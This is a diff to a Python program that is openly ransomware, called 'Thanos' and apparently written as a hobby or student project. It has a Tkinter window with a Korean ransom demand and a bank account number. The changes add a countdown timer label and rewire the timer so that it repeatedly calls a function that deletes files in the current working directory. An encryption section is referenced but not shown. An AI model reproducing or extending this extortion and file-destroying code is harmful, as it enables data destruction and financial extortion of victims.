@@ -14,6 +14,7 @@ gui랑 통합하고 있는 게 integrate_gui
 import tkinter
 from testFile import thanos
 
+timeLimit = 5
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
 
@@ -29,6 +30,9 @@ class tk:
 
         self.l_text = tkinter.Label(self.window, text="타노스 랜섬웨어에 감염되었다.\n1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.\n국민 786102-00-040854\npassword:", fg="red", bg="black", font='Helvetica 14 bold')
         self.l_text.pack()
+
+        self.l_timer = tkinter.Label(self.window, text="타이머 시작 = 5",fg="red", bg="black", font='Helvetica 14 bold')
+        self.l_timer.pack()
 
         self.l_input = tkinter.Label(self.window,
                                     text="password:",
@@ -51,6 +55,16 @@ class tk:
         self.l_input = tkinter.Label(self.window, text="키가 입력되었다 => " + pw, fg="red", bg="black", font="Helvetica 18 bold")
         self.l_input.pack()
         self.pwbutton.destroy()
+    def imagechange(self):
+        # gif 출력
+        self.l_thanos.destroy()
+        self.l_thanos = thanos.AnimatedGIF(gui.frame2, "../ui/thanos1.gif")
+        self.l_thanos.pack()
+        # 다시 타노스얼굴 사진
+        sleep(2)
+        self.l_thanos.destroy()
+        self.l_thanos = tkinter.Label(gui.self.frame2, image=gui.thanos)
+        self.l_thanos.pack()
 
 
 iv = os.urandom(16)
@@ -77,22 +91,19 @@ def list_files(path, ext=None):
 def startTimer(gui):
     print("파일 삭제를 시작합니다")
     #5초에 한번씩 파일 삭제
-    #threading.Timer(5,remove_files(os.getcwd())).start()
-    sleep(5)
-    c = 5
-    clock(gui,c)
-    remove_files(gui, os.getcwd())
+    #threading.Timer(5,remove_files(os.getcwd())).start(
+    clock(gui, 5)
 
 #타이머를 출력해주는 함수 (문제: c가 계속 5로 출력됨)
 def clock(gui,c):
-    if c<=0:
+    c -= 1
+    if c==-2:
+        remove_files(gui, os.getcwd())
         return;
-    label_clock = tkinter.Label(gui.window, text=str(c), fg="red", bg="black", font='Helvetica 14 bold')
-    label_clock.pack()
-    threading.Timer(1, clock, [gui, --c]).start()
+    gui.l_timer.config(text=str(c+1))
+    threading.Timer(1, clock, [gui, c]).start()
 
 def remove_files(gui,path,ext=None):
-    # 2019/11/21 수정 / gif 출력
     gui.l_thanos.destroy()
     gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")
     gui.l_thanos.pack()
@@ -131,14 +142,15 @@ def remove_files(gui,path,ext=None):
     else:
         print("더 이상 삭제할 파일이 없습니다")
 
-
-    # 2019/11/21 수정 / 다시 타노스얼굴 사진
     sleep(2)
     gui.l_thanos.destroy()
     gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos)
     gui.l_thanos.pack()
 
-    threading.Timer(5, remove_files, [gui,os.getcwd()]).start()
+    clock(gui, 5)
+
+
+
 
 #/////////////////////////////////////////////////////////////////////////////////////////////////////////////암호화 복호화 함수
 
